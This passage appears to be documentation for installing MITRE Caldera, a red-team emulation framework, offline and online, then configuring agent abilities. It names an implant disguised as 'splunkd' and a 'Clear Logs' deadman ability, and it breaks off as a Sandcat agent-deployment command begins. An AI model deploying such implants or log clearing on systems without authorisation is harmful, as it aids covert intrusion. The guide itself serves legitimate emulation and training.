+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>pip3<span class="w"> </span>download<span class="w"> </span>-r<span class="w"> </span>~/caldera-offline/caldera/requirements-dev.txt<span class="w"> </span>--dest<span class="w"> </span>~/caldera-offline/caldera/python_deps
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>pip3<span class="w"> </span>download<span class="w"> </span>-r<span class="w"> </span>~/caldera-offline/caldera/requirements.txt<span class="w"> </span>--dest<span class="w"> </span>~/caldera-offline/caldera/python_deps
+</code></pre></div>
+<p>Compress all dependencies for transfer</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>tar<span class="w"> </span>-czvf<span class="w"> </span>caldera-offline.tar.gz<span class="w"> </span>*
+</code></pre></div>
+<p>Transfer <code>caldera-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>
+<h3 id="on-the-air-gapped-environment"><strong>On the Air-Gapped Environment</strong></h3>
+<p>On the air-gapped Ubuntu VM, make a directory called caldera-offline and extract the transferred archive.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>mkdir<span class="w"> </span>~/caldera-offline<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/caldera-offline
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>tar<span class="w"> </span>-xzvf<span class="w"> </span>~/caldera-offline.tar.gz
+</code></pre></div>
+<p>Install the Python3-pip packages in the following order. Verify Python3-pip installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/pip3
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>python3-minimal_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>libpython3-stdlib_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>python3_3.12.3-0ubuntu2_amd64.deb
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>pip3<span class="w"> </span>--version
+</code></pre></div>
+<p>Install Google Chrome and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/chrome
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>google-chrome<span class="w"> </span>--version
+</code></pre></div>
+<p>Install jq and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/jq
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>jq<span class="w"> </span>--help
+</code></pre></div>
+<p>Install curl and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/curl
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>-i<span class="w"> </span>*.deb
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>curl<span class="w"> </span>--help
+</code></pre></div>
+<p>Install upx and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/upx
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>tar<span class="w"> </span>-xvf<span class="w"> </span>upx-4.2.4-amd64_linux.tar.xz
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>sudo<span class="w"> </span>mv<span class="w"> </span>upx-4.2.4-amd64_linux/upx<span class="w"> </span>/usr/local/bin/
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>upx<span class="w"> </span>--version
+</code></pre></div>
+<p>Install Node.js and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/nodejs
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>tar<span class="w"> </span>-xvf<span class="w"> </span>node-v22.13.1-linux-x64.tar.xz
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>sudo<span class="w"> </span>mv<span class="w"> </span>node-v22.13.1-linux-x64<span class="w"> </span>/usr/local/nodejs
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'export PATH=/usr/local/nodejs/bin:$PATH'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="nb">source</span><span class="w"> </span>~/.bashrc
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>node<span class="w"> </span>--version
+</code></pre></div>
+<p>Install npm v11 and verify installation. This process may take some time.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/nodejs/npm
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>tar<span class="w"> </span>-xzf<span class="w"> </span>~/caldera-offline/nodejs/npm/npm-11.0.0.tgz<span class="w"> </span>-C<span class="w"> </span>~/caldera-offline/nodejs/npm<span class="w"> </span>--strip-components<span class="o">=</span><span class="m">1</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>sudo<span class="w"> </span>/usr/local/nodejs/bin/node<span class="w"> </span>~/caldera-offline/nodejs/npm/bin/npm-cli.js<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>--cache<span class="w"> </span>~/caldera-offline/nodejs/npm-cache<span class="w"> </span>--no-audit<span class="w"> </span>--no-fund
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>sudo<span class="w"> </span>ln<span class="w"> </span>-s<span class="w"> </span>/usr/local/nodejs/bin/npm<span class="w"> </span>/usr/bin/npm
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>npm<span class="w"> </span>--version
+</code></pre></div>
+<p>Install Go and verify installation.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/go
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>sudo<span class="w"> </span>tar<span class="w"> </span>-C<span class="w"> </span>/usr/local<span class="w"> </span>-xzf<span class="w"> </span>go1.22.11.linux-amd64.tar.gz
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"export PATH=\$PATH:/usr/local/go/bin"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="nb">source</span><span class="w"> </span>~/.bashrc
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>go<span class="w"> </span>version
+</code></pre></div>
+<p>Restore Golang Dependencies.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>~/go/pkg
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>cp<span class="w"> </span>-r<span class="w"> </span>~/caldera-offline/go-modules/*<span class="w"> </span>~/go/pkg/mod
+</code></pre></div>
+<p>Restore Node.js dependencies for the Magma plugin.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera/plugins/magma
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>cp<span class="w"> </span>-r<span class="w"> </span>~/caldera-offline/node-modules<span class="w"> </span>node_modules
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>cp<span class="w"> </span>-r<span class="w"> </span>~/caldera-offline/magma-dist<span class="w"> </span>dist
+</code></pre></div>
+<p>This restores the Node.js dependencies and built Magma frontend, so you don’t need to run <code>npm install</code> or <code>npm run build</code> again.</p>
+<p>Install all dependencies listed in requirements-dev.txt and requirements.txt.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera/
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements-dev.txt<span class="w"> </span>--no-index<span class="w"> </span>--find-links<span class="o">=</span>./python_deps<span class="w"> </span>--break-system-packages
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt<span class="w"> </span>--no-index<span class="w"> </span>--find-links<span class="o">=</span>./python_deps<span class="w"> </span>--break-system-packages
+</code></pre></div>
+<p><strong>Resolving Common Issues</strong></p>
+<p>If you encounter this warning:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>WARNING:<span class="w"> </span>The<span class="w"> </span>script<span class="w"> </span>safety<span class="w"> </span>is<span class="w"> </span>installed<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">'/home/cyber/.local/bin'</span><span class="w"> </span>which<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>on<span class="w"> </span>PATH.
+</code></pre></div>
+<p>Add the directory to your <code>PATH</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'export PATH="$PATH:/home/cyber/.local/bin"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="nb">source</span><span class="w"> </span>~/.bashrc
+</code></pre></div>
+<h3 id="running-caldera"><strong>Running Caldera</strong></h3>
+<p>Navigate to the Caldera directory and launch the server. Wait until you see All systems ready. This process may take some time. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>python3<span class="w"> </span>server.py<span class="w"> </span>--build<span class="w"> </span>--log<span class="w"> </span>DEBUG
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="m">2025</span>-02-01<span class="w"> </span><span class="m">04</span>:46:20<span class="w"> </span>INFO<span class="w">     </span>Creating<span class="w"> </span>new<span class="w"> </span>secure<span class="w"> </span>config<span class="w"> </span><span class="k">in</span><span class="w"> </span>conf/local.yml<span class="w">                                                                                        </span>config_generator.py:55
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">                    </span>INFO<span class="w">                                                                                                                                         </span>config_generator.py:30
+<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">                             </span>Log<span class="w"> </span>into<span class="w"> </span>Caldera<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>admin<span class="w"> </span>credentials:<span class="w">                                                                                                    </span>
+<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">                                 </span>Red:<span class="w">                                                                                                                                                  </span>
+<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="w">                                     </span>USERNAME:<span class="w"> </span>red<span class="w">                                                                                                                                     </span>
+<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="w">                                     </span>PASSWORD:<span class="w"> </span>&lt;SNIP&gt;<span class="w">                                                                                             </span>
+<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">                                     </span>API_TOKEN:<span class="w"> </span>&lt;SNIP&gt;
+<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="w">                                 </span>Blue:<span class="w">                                                                                                                                                 </span>
+<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="w">                                     </span>USERNAME:<span class="w"> </span>blue<span class="w">                                                                                                                                    </span>
+<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="w">                                     </span>PASSWORD:<span class="w"> </span>&lt;SNIP&gt;<span class="w">                                                                                             </span>
+<a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="w">                                     </span>API_TOKEN:<span class="w"> </span>&lt;SNIP&gt;<span class="w">                                                                                            </span>
+<a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="w">                             </span>To<span class="w"> </span>modify<span class="w"> </span>these<span class="w"> </span>values,<span class="w"> </span>edit<span class="w"> </span>the<span class="w"> </span>conf/local.yml<span class="w"> </span>file.<span class="w">   </span>
+<a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
+<a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>&lt;SNIP&gt;
+<a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>
+<a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="w">                    </span>INFO<span class="w">     </span>All<span class="w"> </span>systems<span class="w"> </span>ready.<span class="w">                                                                                                                           </span>server.py:104
+<a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>
+<a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a><span class="w"> </span>██████╗<span class="w"> </span>█████╗<span class="w"> </span>██╗<span class="w">     </span>██████╗<span class="w"> </span>███████╗██████╗<span class="w">  </span>█████╗
+<a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>██╔════╝██╔══██╗██║<span class="w">     </span>██╔══██╗██╔════╝██╔══██╗██╔══██╗
+<a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>██║<span class="w">     </span>███████║██║<span class="w">     </span>██║<span class="w">  </span>██║█████╗<span class="w">  </span>██████╔╝███████║
+<a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>██║<span class="w">     </span>██╔══██║██║<span class="w">     </span>██║<span class="w">  </span>██║██╔══╝<span class="w">  </span>██╔══██╗██╔══██║
+<a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a>╚██████╗██║<span class="w">  </span>██║███████╗██████╔╝███████╗██║<span class="w">  </span>██║██║<span class="w">  </span>██║
+<a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a><span class="w"> </span>╚═════╝╚═╝<span class="w">  </span>╚═╝╚══════╝╚═════╝<span class="w"> </span>╚══════╝╚═╝<span class="w">  </span>╚═╝╚═╝<span class="w">  </span>╚═╝
+</code></pre></div>
+<p>The login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p>
+<p>At this stage, the web interface can only be accessed on the local machine hosting Caldera using the URL <code>http://localhost:8888</code>. While we can still open the web interface from another host on the same network using <code>http://&lt;IP address&gt;:8888</code>, the login page will be unresponsive.</p>
+<p>To resolve this issue, exit Caldera by pressing <code>Ctrl + C</code>.</p>
+<p>Edit <code>~/caldera-offline/caldera/conf/local.yml</code> with the following details:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>nano<span class="w"> </span>~/caldera-offline/caldera/conf/local.yml
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>app.contact.http:<span class="w"> </span>http://SERVER-IP:8888
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>app.frontend.api_base_url:<span class="w"> </span>http://SERVER-IP:8888
+</code></pre></div>
+<p>Edit <code>~/caldera-offline/caldera/plugins/magma/.env</code> with following details:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>nano<span class="w"> </span>~/caldera-offline/caldera/plugins/magma/.env
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nv">VITE_CALDERA_URL</span><span class="o">=</span>http://SERVER-IP:8888
+</code></pre></div>
+<p>Rebuild Caldera with following parameters. Wait until you see All systems ready. This process may take some time. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">cd</span><span class="w"> </span>~/caldera-offline/caldera
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>python3<span class="w"> </span>server.py<span class="w"> </span>--build<span class="w"> </span>--fresh<span class="w"> </span>--log<span class="w"> </span>DEBUG
+</code></pre></div>
+<p>The newly generated login credential for the web UI can be found in <code>~/caldera-offline/caldera/conf/local.yml</code></p>
+<p>From the Ubuntu VM, verify that you can log in to Caldera's web interface using the Red user’s credentials, with the Caldera VM's IP address as the URL <code>http://&lt;SERVER-IP&gt;:8888</code>. Likewise, verify that you can log in to Caldera's web interface using the Red user’s credentials and the Caldera VM’s IP address from the Caldera VM itself.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image.png" data-desc-position="bottom"><img alt="image.png" src="image.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%201.png" data-desc-position="bottom"><img alt="image.png" src="image%201.png"></a></p>
+<h2 id="installing-caldera-online"><strong>Installing Caldera Online</strong></h2>
+<h3 id="quick-installation"><strong>Quick Installation</strong></h3>
+<p>You can set up Caldera swiftly by running the following four commands in your terminal:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/mitre/caldera.git<span class="w"> </span>--recursive
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="nb">cd</span><span class="w"> </span>caldera
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>python3<span class="w"> </span>server.py<span class="w"> </span>--insecure<span class="w"> </span>--build
+</code></pre></div>
+<h3 id="step-by-step-installation-guide"><strong>Step-by-Step Installation Guide</strong></h3>
+<ol>
+<li>
+<p><strong>Clone the Repository:</strong></p>
+<p>Use a recursive clone to include all plugins. It is recommended to specify a version or release (in <code>x.x.x</code> format). Cloning non-release branches, such as <code>master</code>, may introduce bugs. The basic command is:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/mitre/caldera.git<span class="w"> </span>--recursive<span class="w"> </span>--branch<span class="w"> </span>x.x.x
+</code></pre></div>
+<p>For example, to clone version 5.0.0:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/mitre/caldera.git<span class="w"> </span>--recursive<span class="w"> </span>--branch<span class="w"> </span><span class="m">5</span>.0.0
+</code></pre></div>
+</li>
+<li>
+<p><strong>Navigate to the Directory:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="nb">cd</span><span class="w"> </span>caldera
+</code></pre></div>
+</li>
+<li>
+<p><strong>Install Dependencies:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</code></pre></div>
+</li>
+<li>
+<p><strong>Start the Server:</strong></p>
+<p>Start the server with the <code>--build</code> argument on the first launch or when pulling updates:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>python3<span class="w"> </span>server.py<span class="w"> </span>--build
+</code></pre></div>
+<p>After launching, access the interface at <code>http://localhost:8888</code>. Log in with the default username <code>red</code> and the password found in the <code>conf/local.yml</code> file, generated when the server starts.</p>
+<p>To learn how to use Caldera, visit the Training plugin and complete the capture-the-flag style course.</p>
+</li>
+</ol>
+<h3 id="docker-deployment"><strong>Docker Deployment</strong></h3>
+<p>Caldera can also be installed and run using Docker.</p>
+<ol>
+<li>
+<p><strong>Clone the Repository:</strong></p>
+<p>Clone the repository recursively, specifying the desired version/release:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/mitre/caldera.git<span class="w"> </span>--recursive<span class="w"> </span>--branch<span class="w"> </span>x.x.x
+</code></pre></div>
+</li>
+<li>
+<p><strong>Build the Docker Image:</strong></p>
+<p>Navigate to the repository directory and build the Docker image.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="nb">cd</span><span class="w"> </span>caldera
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>docker<span class="w"> </span>build<span class="w"> </span>--build-arg<span class="w"> </span><span class="nv">WIN_BUILD</span><span class="o">=</span><span class="nb">true</span><span class="w"> </span>.<span class="w"> </span>-t<span class="w"> </span>caldera:server
+</code></pre></div>
+<p>Alternatively, use the <code>docker-compose.yml</code> file:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>docker-compose<span class="w"> </span>build
+</code></pre></div>
+</li>
+<li>
+<p><strong>Run the Docker Container:</strong></p>
+<p>Start the Caldera server, modifying port forwarding as necessary:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">7010</span>:7010<span class="w"> </span>-p<span class="w"> </span><span class="m">7011</span>:7011/udp<span class="w"> </span>-p<span class="w"> </span><span class="m">7012</span>:7012<span class="w"> </span>-p<span class="w"> </span><span class="m">8888</span>:8888<span class="w"> </span>caldera:server
+</code></pre></div>
+</li>
+<li>
+<p><strong>Stop the Docker Container:</strong></p>
+<p>To shut down the container gracefully, first identify the container ID:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>docker<span class="w"> </span>ps
+</code></pre></div>
+<p>Then, send an interrupt signal:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>docker<span class="w"> </span><span class="nb">kill</span><span class="w"> </span>--signal<span class="o">=</span>SIGINT<span class="w"> </span><span class="o">[</span>container<span class="w"> </span>ID<span class="o">]</span>
+</code></pre></div>
+</li>
+</ol>
+<h2 id="introduction-to-caldera"><strong>Introduction to Caldera</strong></h2>
+<h3 id="configuring-abilities"><strong>Configuring Abilities</strong></h3>
+<p>Before deploying Caldera agents, we need to edit the abilities we will be using. In the web UI, under Campaigns, navigate to Abilities. Search for Check Python, then click on it.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%202.png" data-desc-position="bottom"><img alt="image.png" src="image%202.png"></a></p>
+<p>Under Executor, enter following details for linux and windows and delete darwin (if it exists). Click Save. </p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>sh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>python3 —version</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>windows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>psh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>python3 —version</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%203.png" data-desc-position="bottom"><img alt="image.png" src="image%203.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%204.png" data-desc-position="bottom"><img alt="image.png" src="image%204.png"></a></p>
+<p>Search for Check Chrome, then repeat the similar process:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>windows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>psh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>which google-chrome</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>sh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>which google-chrome</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%205.png" data-desc-position="bottom"><img alt="image.png" src="image%205.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%206.png" data-desc-position="bottom"><img alt="image.png" src="image%206.png"></a></p>
+<p>Search for Check Go, then repeat the similar process:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>windows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>psh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>which go</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Executor</td>
+<td>sh</td>
+</tr>
+<tr>
+<td>Command</td>
+<td>which go</td>
+</tr>
+</tbody>
+</table>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%207.png" data-desc-position="bottom"><img alt="image.png" src="image%207.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%208.png" data-desc-position="bottom"><img alt="image.png" src="image%208.png"></a></p>
+<p>In the web GUI, under Campaigns, navigate to Agents and click Configuration.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%209.png" data-desc-position="bottom"><img alt="image.png" src="image%209.png"></a></p>
+<p>The default implant name is 'splunkd', but you can change it. For Bootstrap Abilities, add 'Check Python', 'Check Go', and 'Check Chrome'. For Deadman Abilities, add 'Clear Logs'. Click Save.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="image%2010.png" data-desc-position="bottom"><img alt="image.png" src="image%2010.png"></a></p>
+<h3 id="deploying-linux-agent"><strong>Deploying Linux Agent</strong></h3>
+<p>Click 'Deploy an Agent'. For Agent, select 'Sandcat'. For Platform, select 'Linux'.  Copy and paste the commands into the Linux client.</p>
+<p>For example:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="nv">server</span><span class="o">=</span><span class="s2">"http://10.0.0.100:8888"</span><span class="p">;</span>
